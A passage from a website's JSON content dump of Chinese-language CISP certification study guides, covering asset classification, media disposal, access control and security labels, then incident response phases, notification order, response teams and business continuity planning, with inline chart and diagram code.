\"#4caf50\"}}, {\"value\": 2, \"itemStyle\": {\"color\": \"#4caf50\"}}, {\"value\": 2, \"itemStyle\": {\"color\": \"#4caf50\"}}, {\"value\": 2, \"itemStyle\": {\"color\": \"#4caf50\"}} ] }] }; chart.setOption(option); } })(); 资产类型 保密期限 说明 设施类资产 长期 基础设施配置信息需长期保密 网络类资产 长期 网络架构和配置需长期保密 平台类资产 长期 系统配置和架构需长期保密 介质类资产 长期 存储介质信息需长期保密 应用类资产 长期 应用配置和数据需长期保密 💡 长期保密的原因为什么这些资产需要长期保密： 🏗️ 基础设施变化缓慢 🔧 配置信息长期有效 🎯 攻击者可长期利用 🛡️ 安全架构需持续保护 5.4 机密资料处置 当曾经用于存放机密资料的设备需要处置时，必须采取适当措施。 PC出售前的处理方法： graph TB A[\"机密PC处置\"] B[\"消磁\"] C[\"删除数据\"] D[\"磁盘重整\"] E[\"物理破坏\"] A --> B A --> C A --> D A --> E B --> B1[\"✅ 最佳方法\"] B --> B2[\"彻底清除磁性\"] B --> B3[\"数据无法恢复\"] C --> C1[\"❌ 不安全\"] C --> C2[\"数据可恢复\"] D --> D1[\"❌ 不安全\"] D --> D2[\"数据可恢复\"] E --> E1[\"✅ 最安全\"] E --> E2[\"但设备无法出售\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#ffebee,stroke:#c62828 style D fill:#ffebee,stroke:#c62828 style E fill:#e8f5e9,stroke:#388e3d 💡 消磁是最佳选择在公开市场出售时选择消磁的原因： ✅ 彻底清除 破坏磁性介质的磁性 数据无法通过任何方式恢复 符合安全要求 ✅ 设备可用 硬盘仍可使用（需重新格式化） 设备可以正常出售 平衡安全与经济性 ❌ 其他方法的问题： 删除数据：可通过工具恢复 磁盘重整：数据仍可恢复 物理破坏：设备无法出售 5.5 档案访问控制 防止擅自使用资料档案的方法： 方法 有效性 说明 使用访问控制软件 ⭐⭐⭐⭐⭐ 最有效 技术手段强制控制 自动化的档案访问入口 ⭐⭐⭐⭐ 有效 统一入口便于管理 磁带库管理 ⭐⭐⭐ 一般 仅适用于磁带介质 物理隔离 ⭐⭐⭐⭐ 有效 物理层面控制 💡 访问控制软件最有效使用访问控制软件的优势： 🔐 强制访问控制 📊 详细审计日志 👥 细粒度权限管理 ⚡ 实时监控和告警 🔄 集中管理和配置 5.6 安全标记 安全标记的定义： 给计算机系统的资产分配的记号被称为安全标记（Security Label）。 安全标记的作用： 🏷️ 标识资产的敏感等级 🔒 指导访问控制决策 📋 支持强制访问控制（MAC） 📊 便于资产分类管理 相关概念区分： 术语 含义 用途 安全标记 资产的敏感性标识 标识和控制 安全属性 资产的安全特性 描述安全特征 安全特征 资产的安全表现 安全评估 安全级别 安全保护等级 分级保护 六、资产安全责任 6.1 安全措施责任人 维持对于信息资产的适当的安全措施的责任在于安全管理员。 责任分配： graph TB A[\"资产安全责任\"] B[\"安全管理员\"] C[\"系统管理员\"] D[\"资产所有者\"] E[\"系统作业人员\"] A --> B A --> C A --> D A --> E B --> B1[\"✅ 主要责任\"] B --> B2[\"制定安全措施\"] B --> B3[\"监督实施\"] B --> B4[\"持续改进\"] C --> C1[\"技术实施\"] C --> C2[\"日常维护\"] D --> D1[\"决策支持\"] D --> D2[\"资源提供\"] E --> E1[\"执行操作\"] E --> E2[\"遵守规定\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#e3f2fd,stroke:#1976d2 style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 💡 安全管理员的核心责任为什么安全管理员负主要责任： 📋 专业职责 安全是其核心工作 具备专业知识和技能 了解安全最佳实践 🎯 全局视角 统筹整体安全策略 协调各方资源 平衡安全与业务 🔄 持续改进 监控安全状况 评估安全措施有效性 及时调整和优化 七、总结 资产管理的核心在于： 分类清晰：正确识别和分类各类资产 责任明确：每个资产都有明确的所有者、管理者和使用者 敏感性管理：正确标识和保护敏感资产 全程管理：覆盖资产全生命周期 定期盘点：确保资产清单准确完整 分级保护：根据资产重要性实施差异化保护 🎯 关键要点 操作系统属于平台资产，不是设备资产 基础服务平台属于平台资产，不是网络资产 纸质文档属于数据资产，不是介质资产 电子数据属于数据资产，不是无形资产 信息资产必须明确所有者、管理者和使用者 厂商不是资产责任人 敏感性即机密性，是资产的保密特性 个人签名不属于敏感性标识方法 设施、网络、平台、介质、应用类资产保密期限为长期 机密PC出售前应进行消磁处理 使用访问控制软件是防止擅自使用档案的最有效方法 安全标记是给资产分配的敏感性记号 安全管理员负责维持资产的安全措施 💡 实践建议 建立完整的资产清单数据库 使用资产管理系统自动化管理 定期进行资产盘点和审计 建立资产变更管理流程 实施资产分级保护策略 加强资产安全意识培训","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：信息安全事件管理与业务连续性","slug":"2025/10/CISP-Security-Incident-Management-zh-CN","date":"un44fin44","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Security-Incident-Management/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Security-Incident-Management/","excerpt":"深入解析CISP认证中的信息安全事件管理和业务连续性管理知识点，涵盖事件响应流程、通知机制、应急处理和灾难恢复。","text":"信息安全事件管理和业务连续性管理是组织应对安全威胁和灾难的关键能力，有效的事件响应和灾难恢复可以最大限度地减少损失，快速恢复业务运营。 一、安全事件概述 1.1 什么是安全事件 安全事件定义： 信息安全事件是指可能对组织的信息资产、业务运营或声誉造成不利影响的事件，包括： 🔓 未授权访问 🦠 恶意软件感染 📧 钓鱼攻击 💥 拒绝服务攻击 📤 数据泄露 🔧 系统故障 👤 内部威胁 1.2 事件分类 按严重程度分类： graph TB A[\"安全事件分类\"] B[\"低级事件\"] C[\"中级事件\"] D[\"高级事件\"] E[\"严重事件\"] A --> B A --> C A --> D A --> E B --> B1[\"影响范围小无数据泄露快速恢复\"] C --> C1[\"影响部分系统可能有数据泄露需要协调响应\"] D --> D1[\"影响核心系统确认数据泄露需要高层介入\"] E --> E1[\"业务严重中断大规模数据泄露可能触犯法律\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#fff3e0,stroke:#f57c00 style D fill:#ffccbc,stroke:#d84315 style E fill:#ffcdd2,stroke:#b71c1c 二、事件响应流程 2.1 事件响应六个阶段 事件响应六个阶段定义了安全事件处理的流程，这个流程的顺序是： 准备 → 确认 → 遏制 → 根除 → 恢复 → 跟踪 graph LR A[\"准备\"] --> B[\"确认\"] B --> C[\"遏制\"] C --> D[\"根除\"] D --> E[\"恢复\"] E --> F[\"跟踪\"] A --> A1[\"建立应急能力准备工具和资源\"] B --> B1[\"确认事件评估影响\"] C --> C1[\"隔离系统阻止扩散\"] D --> D1[\"清除威胁修复漏洞\"] E --> E1[\"恢复服务验证安全\"] F --> F1[\"总结经验持续改进\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#f3e5f5,stroke:#7b1fa2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#ffebee,stroke:#c62828 style E fill:#e8f5e9,stroke:#388e3d style F fill:#fce4ec,stroke:#c2185b 💡 事件响应六阶段顺序正确的顺序：准备→确认→遏制→根除→恢复→跟踪 1️⃣ 准备阶段 建立应急响应能力 准备工具和资源 制定应急计划 培训应急团队 2️⃣ 确认阶段 确认安全事件 评估事件影响 分类事件类型 确定响应等级 3️⃣ 遏制阶段 隔离受影响系统 阻止威胁扩散 保护关键资产 4️⃣ 根除阶段 清除威胁根源 修复安全漏洞 加固系统安全 5️⃣ 恢复阶段 恢复系统服务 验证系统安全 恢复业务运营 6️⃣ 跟踪阶段 总结经验教训 持续改进措施 更新应急计划 ❌ 错误的顺序： 准备→遏制→确认→根除→恢复→跟踪 ❌ 准备→确认→遏制→恢复→根除→跟踪 ❌ 准备→遏制→根除→确认→恢复→跟踪 ❌ 六阶段详细对比： 阶段 主要活动 关键输出 负责人 准备 建立能力、准备资源 应急计划、工具 安全团队 确认 确认、分类、评估 事件严重程度 安全分析师 遏制 隔离、阻断、保护 威胁被控制 响应团队 根除 清除、修复、加固 威胁被消除 技术团队 恢复 还原、测试、监控 服务恢复正常 运维团队 跟踪 分析、报告、改进 降低再发风险 安全经理 2.2 标准响应流程 graph LR A[\"检测\"] --> B[\"分析\"] B --> C[\"遏制\"] C --> D[\"根除\"] D --> E[\"恢复\"] E --> F[\"跟踪\"] A --> A1[\"监控告警用户报告\"] B --> B1[\"确认事件评估影响\"] C --> C1[\"隔离系统阻止扩散\"] D --> D1[\"清除威胁修复漏洞\"] E --> E1[\"恢复服务验证安全\"] F --> F1[\"降低风险防止再发\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#f3e5f5,stroke:#7b1fa2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#ffebee,stroke:#c62828 style E fill:#e8f5e9,stroke:#388e3d style F fill:#fce4ec,stroke:#c2185b 各阶段详解： 阶段 主要活动 关键输出 负责人 检测 监控、告警、报告 事件初步信息 监控团队 分析 确认、分类、评估 事件严重程度 安全分析师 遏制 隔离、阻断、保护 威胁被控制 响应团队 根除 清除、修复、加固 威胁被消除 技术团队 恢复 还原、测试、监控 服务恢复正常 运维团队 跟踪 分析、报告、改进 降低再发风险 安全经理 2.2 各阶段目标详解 应急响应各阶段的核心目标： graph TB A[\"应急响应阶段\"] B[\"遏制阶段\"] C[\"根除阶段\"] D[\"恢复阶段\"] E[\"跟踪阶段\"] A --> B A --> C A --> D A --> E B --> B1[\"制止事态扩大\"] B --> B2[\"隔离受影响系统\"] B --> B3[\"防止进一步损失\"] C --> C1[\"实施补救措施\"] C --> C2[\"清除威胁根源\"] C --> C3[\"修复安全漏洞\"] D --> D1[\"恢复系统运营\"] D --> D2[\"验证系统安全\"] D --> D3[\"恢复业务服务\"] E --> E1[\"降低风险再发\"] E --> E2[\"总结经验教训\"] E --> E3[\"改进安全措施\"] style B fill:#fff3e0,stroke:#f57c00 style C fill:#ffebee,stroke:#c62828 style D fill:#e8f5e9,stroke:#388e3d style E fill:#e3f2fd,stroke:#1976d2 2.3 恢复阶段的行动 恢复阶段的主要工作内容： graph TB A[\"恢复阶段行动\"] B[\"✅ 建立临时业务处理能力\"] C[\"✅ 修复原系统损害\"] D[\"✅ 在原系统或新设施中恢复运行\"] E[\"❌ 避免造成更大损失\"] A --> B A --> C A --> D A --> E B --> B1[\"临时环境搭建\"] B --> B2[\"关键业务优先\"] B --> B3[\"确保业务连续性\"] C --> C1[\"系统修复\"] C --> C2[\"数据恢复\"] C --> C3[\"配置还原\"] D --> D1[\"系统测试\"] D --> D2[\"业务验证\"] D --> D3[\"正式上线\"] E --> E1[\"这是遏制阶段的工作\"] E --> E2[\"不属于恢复阶段\"] style B fill:#e8f5e9,stroke:#388e3d style C fill:#e8f5e9,stroke:#388e3d style D fill:#e8f5e9,stroke:#388e3d style E fill:#ffcdd2,stroke:#b71c1c 💡 恢复阶段 vs 遏制阶段恢复阶段的主要工作： ✅ 建立临时业务处理能力 在原系统无法使用时提供临时方案 确保关键业务不中断 可能使用备用系统或手工流程 ✅ 修复原系统损害 修复被破坏的系统组件 恢复被删除或损坏的数据 重新配置系统参数 ✅ 在原系统或新设施中恢复运行 将业务迁移回修复后的原系统 或在新设施中重建系统 确保系统正常运行 ❌ 避免造成更大损失 - 这是遏制阶段的工作 遏制阶段：制止事态扩大，防止进一步损失 恢复阶段：系统已被控制，重点是恢复运营 两个阶段的目标不同 恢复阶段与遏制阶段的区别： 方面 遏制阶段 恢复阶段 主要目标 制止事态扩大 恢复系统运营 关键行动 隔离、阻断、防止损失 修复、测试、恢复业务 时间要求 立即执行 遏制后按计划执行 成功标准 威胁被控制 业务恢复正常 💡 跟踪阶段的重要性跟踪阶段用来降低事件再次发生的风险： 📊 根本原因分析 深入分析事件发生原因 识别安全控制缺陷 找出流程漏洞 🔄 持续改进 制定改进措施 更新安全策略 加强防护能力 📚 知识积累 记录事件处理经验 更新应急预案 培训团队成员 与其他阶段的区别： 遏制 - 制止事态扩大 根除 - 实施补救措施 恢复 - 使系统或业务恢复运营 跟踪 - 降低风险再次发生的可能性 ✅ 阶段目标对比： 阶段 主要目标 时间要求 成功标准 遏制 制止事态扩大 立即 威胁被隔离 根除 清除威胁根源 尽快 威胁被消除 恢复 恢复系统运营 按计划 服务正常 跟踪 降低再发风险 持续 改进措施落实 2.4 响应时间要求 不同级别事件的响应时间： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_825496074')); var option = { \"title\": { \"text\": \"安全事件响应时间要求\" }, \"tooltip\": { \"trigger\": \"axis\", \"axisPointer\": { \"type\": \"shadow\" } }, \"legend\": { \"data\": [\"初步响应\", \"遏制完成\", \"完全恢复\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"低级事件\", \"中级事件\", \"高级事件\", \"严重事件\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"时间（小时）\" }, \"series\": [ { \"name\": \"初步响应\", \"type\": \"bar\", \"data\": [4, 2, 1, 0.5], \"itemStyle\": {\"color\": \"#4caf50\"} }, { \"name\": \"遏制完成\", \"type\": \"bar\", \"data\": [24, 8, 4, 2], \"itemStyle\": {\"color\": \"#ff9800\"} }, { \"name\": \"完全恢复\", \"type\": \"bar\", \"data\": [72, 48, 24, 12], \"itemStyle\": {\"color\": \"#2196f3\"} } ] }; chart.setOption(option); } })(); 三、事件通知机制 3.1 通知优先级 在计算机安全事故发生时，需要按照优先级通知相关人员。 通知顺序和优先级： graph TB A[\"安全事件发生\"] B[\"第一时间通知\"] C[\"及时通知\"] D[\"适时通知\"] E[\"最后通知\"] A --> B A --> C A --> D A --> E B --> B1[\"系统管理员立即响应\"] B --> B2[\"恢复协调员协调资源\"] C --> C1[\"硬件和软件厂商技术支持\"] C --> C2[\"安全团队分析处理\"] D --> D1[\"管理层决策支持\"] D --> D2[\"相关业务部门业务影响评估\"] E --> E1[\"律师法律咨询\"] E --> E2[\"公关部门对外沟通\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#fff3e0,stroke:#f57c00 style D fill:#ffccbc,stroke:#d84315 style E fill:#ffcdd2,stroke:#b71c1c 💡 为什么律师最后通知律师不被通知或最后才被通知的原因： ⏱️ 时间敏感性 技术响应需要立即进行 律师介入可能延缓技术处理 法律咨询不是紧急技术响应的前提 🔧 技术优先 首要任务是遏制和恢复 技术团队需要快速决策 法律问题可以事后处理 📋 证据保全 技术团队会保留必要证据 律师介入时机应在事件稳定后 避免法律程序影响技术响应 💼 业务连续性 优先恢复业务运营 法律问题通常不影响技术恢复 律师咨询可以并行进行 通知人员及其职责： 角色 通知优先级 主要职责 通知时机 系统管理员 🔴 最高 技术响应、系统恢复 立即 恢复协调员 🔴 最高 协调资源、统筹响应 立即 硬件/软件厂商 🟡 高 技术支持、补丁提供 确认需要后 安全团队 🟡 高 威胁分析、安全加固 初步分析后 管理层 🟠 中 决策支持、资源批准 评估影响后 业务部门 🟠 中 业务影响评估、用户沟通 影响明确后 律师 🟢 低 法律咨询、合规建议 事件稳定后 公关部门 🟢 低 对外沟通、声誉管理 需要对外时 3.2 组织内应急通知方式 组织内应急通知应主要采用电话方式： graph TB A[\"应急通知方式\"] B[\"电话通知\"] C[\"其他方式\"] A --> B A --> C B --> B1[\"✅ 快速有效\"] B --> B2[\"✅ 实时沟通\"] B --> B3[\"✅ 确认接收\"] B --> B4[\"✅ 紧急情况首选\"] C --> C1[\"电子邮件\"] C --> C2[\"人员传达\"] C --> C3[\"公司OA\"] C1 --> C1A[\"❌ 效率较低\"] C2 --> C2A[\"❌ 效率较低\"] C3 --> C3A[\"❌ 效率较低\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#ffcdd2,stroke:#b71c1c 📞 为什么电话是首选通知方式电话通知的优势： ⚡ 快速有效 立即送达，无延迟 实时双向沟通 可以立即确认接收 🎯 适合紧急情况 安全事件需要快速响应 时间就是损失 不能等待邮件查收 ✅ 确保送达 直接联系到人 可以确认对方理解 避免信息遗漏 ❌ 其他方式的局限： 电子邮件 - 可能不及时查看，效率较低 人员传达 - 传递速度慢，可能失真 公司OA - 需要登录查看，效率较低 通知方式对比： 通知方式 速度 确认性 适用场景 推荐度 电话 ⚡ 最快 ✅ 高 紧急事件 🔴 首选 短信 ⚡ 快 ⚠️ 中 简短通知 🟡 备选 电子邮件 🐌 慢 ❌ 低 详细信息 🟢 补充 OA系统 🐌 慢 ❌ 低 正式通知 🟢 补充 人员传达 🐌 很慢 ❌ 低 非紧急 ⚪ 不推荐 3.3 应急响应小组通知顺序 如果可能，最应该得到第一个应急事件通知的小组是应急响应日常运行小组： graph TB A[\"安全事件发生\"] B[\"第一通知\"] C[\"后续通知\"] A --> B B --> C B --> B1[\"应急响应日常运行小组\"] B1 --> B1A[\"评估损害性质和程度\"] B1A --> B1B[\"确定如何实施应急响应计划\"] C --> C1[\"应急响应技术保障小组\"] C --> C2[\"应急响应实施小组\"] C --> C3[\"应急响应领导小组\"] style B fill:#c8e6c9,stroke:#2e7d32 style B1 fill:#e3f2fd,stroke:#1976d2 💡 为什么日常运行小组应该第一个得到通知日常运行小组的关键作用： 🔍 损害评估 对系统损害性质和程度的评估非常重要 需要在确保人员安全的前提下尽快完成 评估结果决定如何实施应急响应计划 ⚡ 快速决策 确定信息安全事件后如何实施应急响应计划 评估是否需要激活完整的应急响应 决定需要调动哪些资源 👥 人员安全优先 最优先任务是确保人员安全 在此前提下尽快完成损害评估 避免盲目响应造成更大损失 ❌ 为什么不是领导小组： 领导小组负责决策和资源调配 但需要先有损害评估信息 日常运行小组提供决策依据 应急响应小组通知顺序和职责： 通知顺序 小组名称 主要职责 通知时机 1️⃣ 第一 应急响应日常运行小组 损害评估、确定响应方案 事件发生后立即 2️⃣ 第二 应急响应技术保障小组 提供技术支持和资源 评估完成后 3️⃣ 第三 应急响应实施小组 执行具体响应措施 方案确定后 4️⃣ 第四 应急响应领导小组 重大决策、资源调配 需要高层决策时 3.4 通知内容 事件通知应包含的信息： 事件通知模板： ├── 基本信息 │ ├── 事件编号 │ ├── 发现时间 │ ├── 报告人 │ └── 事件类型 ├── 事件描述 │ ├── 受影响系统 │ ├── 攻击方式 │ ├── 当前状态 │ └── 初步影响 ├── 响应措施 │ ├── 已采取的行动 │ ├── 计划的措施 │ ├── 需要的支持 │ └── 预计恢复时间 └── 后续安排 ├── 下次更新时间 ├── 联系人信息 └── 升级机制 四、应急响应团队 4.1 团队组成 计算机安全事件响应团队（CSIRT）： graph TB A[\"CSIRT团队\"] B[\"核心成员\"] C[\"扩展成员\"] D[\"外部支持\"] A --> B A --> C A --> D B --> B1[\"事件响应经理\"] B --> B2[\"安全分析师\"] B --> B3[\"系统管理员\"] B --> B4[\"网络工程师\"] C --> C1[\"业务代表\"] C --> C2[\"法务顾问\"] C --> C3[\"公关人员\"] C --> C4[\"人力资源\"] D --> D1[\"厂商技术支持\"] D --> D2[\"外部安全专家\"] D --> D3[\"执法机构\"] D --> D4[\"监管机构\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#f3e5f5,stroke:#7b1fa2 团队成员职责： 角色 主要职责 所需技能 事件响应经理 统筹协调、决策指挥 管理、沟通、技术 安全分析师 威胁分析、取证调查 安全技术、分析能力 系统管理员 系统恢复、配置修复 系统管理、故障排除 网络工程师 网络隔离、流量分析 网络技术、协议分析 4.2 团队准备 日常准备工作： ✅ 培训演练 定期进行桌面演练 模拟真实事件场景 测试响应流程 评估响应能力 ✅ 工具准备 取证工具包 备份恢复系统 通信工具 文档模板 ✅ 知识库建设 事件处理手册 联系人清单 系统配置文档 历史事件记录 五、应急响应计划 5.1 应急响应计划与应急响应的关系 应急响应计划与应急响应的相互关系： 应急响应计划与应急响应这两个方面是相互补充与促进的关系。 graph LR A[\"应急响应计划\"] --> B[\"指导策略\"] B --> C[\"应急响应\"] C --> D[\"发现不足\"] D --> E[\"改进计划\"] E --> A style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style D fill:#ffebee,stroke:#c62828 style E fill:#f3e5f5,stroke:#7b1fa2 💡 应急响应计划与应急响应的关系正确的理解： ✅ 相互补充与促进 应急响应计划为应急响应提供指导 应急响应实践验证计划的有效性 两者相互促进、持续改进 ✅ 计划提供指导 应急响应计划为信息安全事件发生后的应急响应提供了指导策略和规范 明确响应流程和职责分工 提供处置措施和资源保障 ✅ 响应发现不足 应急响应可能发现事前应急响应计划的不足 实践中暴露计划的缺陷 为计划改进提供依据 ❌ 错误的理解： 应急响应必须完全依照应急响应计划执行 ❌ 应急响应计划不一定跟现实情况完全匹配 可以根据实际情况灵活调整 计划是指导而非僵化的规定 应急响应的灵活性： 方面 说明 计划作用 提供指导框架和基本规范 执行灵活性 可根据实际情况调整 调整原则 在保证目标的前提下灵活应对 改进机制 从实践中发现问题并改进计划 5.2 应急响应计划测试 应急响应计划测试频率： 应急响应计划应该在以下情况进行测试： ✅ 当基础环境或设施发生变化时 ✅ 当组织内业务发生重大的变更时 ✅ 至少每年进行一次 💡 应急响应计划测试时机何时需要测试应急响应计划： 🏢 业务重大变更 公司业务发生重大改变 组织架构调整 新业务系统上线 🔧 环境设施变化 基础环境发生变化 设施更新或迁移 技术架构调整 📅 定期测试 至少每年进行一次 确保计划的有效性 保持团队响应能力 ❌ 不合理的测试频率： 10年测试一次 - 太长，计划可能过时 2年测试一次 - 不够频繁 测试类型： 测试类型 说明 频率 桌面演练 讨论式演练，模拟场景 每季度 功能测试 测试特定功能或流程 每半年 全面演练 完整的实战演练 每年 触发测试 环境或业务变更后 按需 5.3 应急响应计划建立步骤 建立应急响应计划的正确步骤： graph TB A[\"1. 获得管理层支持\"] --> B[\"2. 实施业务影响分析\"] B --> C[\"3. 确定应急人员\"] C --> D[\"4. 建立业务恢复计划\"] D --> E[\"5. 建立备份解决方案\"] E --> F[\"6. 测试和演练\"] A --> A1[\"最重要的第一步\"] B --> B1[\"识别关键系统和业务\"] C --> C1[\"组建应急响应团队\"] D --> D1[\"制定恢复策略\"] E --> E1[\"确保数据可恢复\"] F --> F1[\"验证计划有效性\"] style A fill:#c8e6c9,stroke:#2e7d32 style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#e8f5e9,stroke:#388e3d style F fill:#fce4ec,stroke:#c2185b 💡 建立应急响应计划的关键步骤第一步：获得管理层支持（最重要） 👔 为什么管理层支持最重要： 落实应有的关注和重视 提供必要的资源和资金 确保各部门配合 赋予计划权威性 📊 第二步：实施业务影响分析 识别关键系统和业务 确定应急与恢复优先级 评估业务中断影响 为后续工作提供依据 步骤顺序的重要性： 没有管理层支持，计划难以推进 没有业务影响分析，无法确定优先级 步骤顺序不能颠倒 各步骤详解： 步骤 主要工作 关键输出 负责人 1. 管理层支持 获得承诺、资源、授权 项目批准、预算 高层管理 2. 业务影响分析 识别关键业务、评估影响 BIA报告 业务部门+安全团队 3. 确定应急人员 组建团队、明确职责 团队名单、职责表 安全经理 4. 业务恢复计划 制定恢复策略和流程 恢复计划 应急团队 5. 备份解决方案 建立备份和恢复机制 备份方案 技术团队 6. 测试和演练 验证计划有效性 测试报告 全体成员 5.4 业务影响分析（BIA） 业务影响分析的工作内容： 业务影响分析（BIA）包括以下工作内容： ✅ 确定应急响应的恢复目标 ✅ 确定公司的关键系统和业务 ✅ 确定支持公司运行的关键系统 ❌ 确定业务面临风险时的潜在损失和影响（属于风险评估） graph TB A[\"业务影响分析 BIA\"] B[\"识别关键业务\"] C[\"确定恢复目标\"] D[\"识别关键系统\"] E[\"评估业务依赖\"] A --> B A --> C A --> D A --> E B --> B1[\"核心业务流程\"] B --> B2[\"业务优先级\"] C --> C1[\"RTO恢复时间目标\"] C --> C2[\"RPO恢复点目标\"] D --> D1[\"关键IT系统\"] D --> D2[\"支持系统\"] E --> E1[\"系统依赖关系\"] E --> E2[\"资源需求\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#e8f5e9,stroke:#388e3d style C fill:#fff3e0,stroke:#f57c00 style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#fce4ec,stroke:#c2185b 💡 BIA与风险评估的区别业务影响分析（BIA）的工作： ✅ 确定关键业务和系统 识别对组织最重要的业务 确定支持业务的关键系统 分析业务和系统的依赖关系 ✅ 确定恢复目标 RTO（Recovery Time Objective）恢复时间目标 RPO（Recovery Point Objective）恢复点目标 最大可容忍中断时间 ❌ 不属于BIA的工作： 确定业务面临风险时的潜在损失和影响 这是风险评估（Risk Assessment）的工作 BIA关注&quot;影响&quot;，风险评估关注&quot;损失&quot; BIA与风险评估对比： 方面 业务影响分析（BIA） 风险评估（RA） 关注点 业务中断的影响 威胁和脆弱性 目标 确定恢复优先级 识别和评估风险 输出 关键业务、RTO/RPO 风险清单、损失评估 时机 应急计划制定前 安全规划阶段 5.5 应急响应策略制定 制定应急响应策略的考虑因素： 制定应急响应策略主要需要考虑以下三个因素： ✅ 系统恢复能力等级划分 ✅ 系统恢复资源的要求 ✅ 费用考虑 ❌ 人员考虑（不是主要因素） 💡 应急响应策略制定的三大因素主要考虑因素： 📊 系统恢复能力等级划分 参考GB/T 20988-2007《信息安全技术 信息系统灾难恢复规范》 附录A 灾难恢复能力等级划分 从第0级到第6级 🔧 系统恢复资源的要求 参考GB/T 20988-2007 第6.3节 灾难恢复资源要求 包括场地、设备、网络、数据等 💰 费用考虑 投资成本与业务价值平衡 不同等级的成本差异 ROI（投资回报率）分析 ❌ 人员不是主要考虑因素 人员是实施层面的问题 不是策略制定的主要因素 灾难恢复能力等级： 等级 名称 恢复能力 适用场景 第0级 无备份 无恢复能力 非关键系统 第1级 数据备份 数据可恢复 一般系统 第2级 热备份 快速恢复 重要系统 第3级 活动备份 小时级恢复 关键系统 第4级 实时备份 分钟级恢复 核心系统 第5级 双活中心 秒级切换 极关键系统 第6级 零数据丢失 无数据丢失 最高要求 5.6 应急响应领导小组 应急响应领导小组的组成和职责： 应急响应领导小组是信息安全应急响应工作的组织领导机构。 graph TB A[\"应急响应领导小组\"] B[\"组长最高管理层\"] C[\"副组长IT部门领导\"] D[\"成员各部门代表\"] A --> B A --> C A --> D B --> B1[\"总体领导\"] B --> B2[\"重大决策\"] B --> B3[\"资源调配\"] C --> C1[\"协助组长\"] C --> C2[\"技术指导\"] C --> C3[\"日常管理\"] D --> D1[\"部门协调\"] D --> D2[\"执行任务\"] D --> D3[\"信息反馈\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#e3f2fd,stroke:#1976d2 style D fill:#fff3e0,stroke:#f57c00 💡 应急响应领导小组组长组长应由最高管理层担任： 👔 为什么必须是最高管理层： 具有足够的权威性 能够调动全组织资源 可以做出重大决策 体现组织对安全的重视 ❌ 不适合担任组长的角色： 信息技术部门领导 - 权限不够 业务部门领导 - 视角局限 外部专家 - 非组织成员 应急响应领导小组主要职责： 领导小组的职责是领导和决策信息安全应急响应的重大事宜，主要包括： ✅ 对应急响应工作的承诺和支持，包括发布正式文件、提供必要资源（人财物）等 ✅ 审核并批准应急响应策略 ✅ 审核并批准应急响应计划 ✅ 批准和监督应急响应计划的执行 ✅ 启动定期评审、修订应急响应计划 ❌ 组织应急响应计划演练（不是领导小组的职责，是工作小组的职责） 职责对比： 职责 领导小组 工作小组 承诺和支持 ✅ 是 ❌ 否 审批策略和计划 ✅ 是 ❌ 否 监督执行 ✅ 是 ❌ 否 组织演练 ❌ 否 ✅ 是 具体实施 ❌ 否 ✅ 是 技术处理 ❌ 否 ✅ 是 批准权限： 应急响应计划的批准权在管理层。 角色 是否有批准权 说明 管理层 ✅ 是 拥有公司内所有事件的批准权 应急委员会 ❌ 否 负责执行，无批准权 各部门 ❌ 否 参与制定，无批准权 外部专家 ❌ 否 提供建议，无批准权 5.7 应急响应流程顺序 应急响应流程的正确顺序： 应急响应流程一般顺序是：信息安全事件通告 → 信息安全事件评估 → 应急启动 → 应急处置 → 后期处置 graph LR A[\"1. 信息安全事件通告\"] --> B[\"2. 信息安全事件评估\"] B --> C[\"3. 应急启动\"] C --> D[\"4. 应急处置\"] D --> E[\"5. 后期处置\"] A --> A1[\"发现并报告事件\"] B --> B1[\"评估严重程度\"] C --> C1[\"启动应急预案\"] D --> D1[\"遏制、根除、恢复\"] E --> E1[\"总结、改进\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#ffebee,stroke:#c62828 style D fill:#e8f5e9,stroke:#388e3d style E fill:#f3e5f5,stroke:#7b1fa2 💡 应急响应流程顺序的重要性为什么必须按这个顺序： 1️⃣ 信息安全事件通告（第一步） 发现事件后立即通告 启动应急响应机制 通知相关人员 2️⃣ 信息安全事件评估（第二步） 评估事件严重程度 确定影响范围 决定响应级别 3️⃣ 应急启动（第三步） 根据评估结果启动预案 调动应急资源 明确响应策略 4️⃣ 应急处置（第四步） 遏制事态发展 根除威胁 恢复系统 5️⃣ 后期处置（第五步） 事后总结分析 改进措施 更新预案 流程阶段对比： 阶段 主要活动 时间要求 关键输出 事件通告 发现、报告、通知 立即 事件报告 事件评估 分析、评估、分级 快速 评估报告 应急启动 启动预案、调动资源 及时 启动决定 应急处置 遏制、根除、恢复 持续 处置记录 后期处置 总结、改进、更新 事后 改进计划 5.8 应急响应计划培训 应急响应计划培训频率： 在正常情况下，应急响应计划培训应该至少每年举办一次。 💡 应急响应计划培训要求培训频率： 📅 至少每年一次 对于应急响应计划的培训是对测试的补充 培训至少每年举办一次 